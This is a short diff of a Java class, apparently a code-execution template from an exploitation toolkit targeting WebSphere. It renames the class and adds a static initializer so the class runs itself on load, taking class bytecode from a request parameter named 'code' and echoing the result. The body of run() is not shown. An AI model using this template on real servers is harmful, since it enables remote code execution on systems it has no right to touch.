@@ -6,12 +6,19 @@ import java.lang.reflect.Method;
 /**
  * 执行代码回显(classBytes)
  */
-public class WebSphereCodeExecTpl {
+public class CodeExec
+{
 
-    public WebSphereCodeExecTpl() {
+    public CodeExec() {
         run();
     }
 
+    static {
+        try {
+            new CodeExec();
+        } catch (Exception e) {
+        }
+    }
     // 传参：类字节码
     private  String getReqParamName() {
         return "code";
